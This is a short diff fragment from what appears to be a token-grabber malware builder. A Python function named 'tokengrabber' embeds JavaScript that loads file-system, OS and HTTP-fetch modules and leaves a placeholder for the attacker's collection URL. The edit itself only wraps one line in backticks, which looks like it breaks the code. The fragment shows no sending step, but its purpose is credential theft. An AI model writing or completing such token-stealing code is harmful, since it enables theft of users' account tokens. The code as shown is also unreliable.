@@ -55,7 +55,7 @@ def tokengrabber():
 const fs = require("fs");
 let os = require("os")
 const fetch = require('node-fetch');
-var dir = __dirname.split("\\")
+var dir = `__dirname.split("\\")`
 const url = `~~TOKENURLHERE~~`;
 
 
